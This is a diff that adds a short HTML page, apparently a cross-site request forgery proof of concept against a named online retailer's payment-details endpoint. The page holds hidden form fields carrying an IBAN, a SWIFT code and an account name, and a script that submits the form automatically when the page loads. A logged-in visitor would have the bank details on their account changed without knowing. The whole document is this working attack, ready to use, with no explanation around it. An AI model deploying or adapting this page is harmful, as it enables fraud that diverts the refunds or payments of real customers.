@@ -1,0 +1,17 @@
+<html>
+  <body>
+    <form action="https://www.spartoo.co.uk/ajax/compte/paiements.php?process_action=edit_iban" method="POST">
+      <input type="hidden" name="no&#95;exit" value="1" />
+      <input type="hidden" name="customers&#95;bank&#95;id" value="" />
+      <input type="hidden" name="iban" value="FR7630006000011234567890189" />
+      <input type="hidden" name="swift" value="AGRIFRPP" />
+      <input type="hidden" name="iban&#95;name" value="CSRF-musana" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+document.addEventListener('DOMContentLoaded', function () {
+    document.forms[0].submit();
+});
+    </script>
+  </body>
+</html>
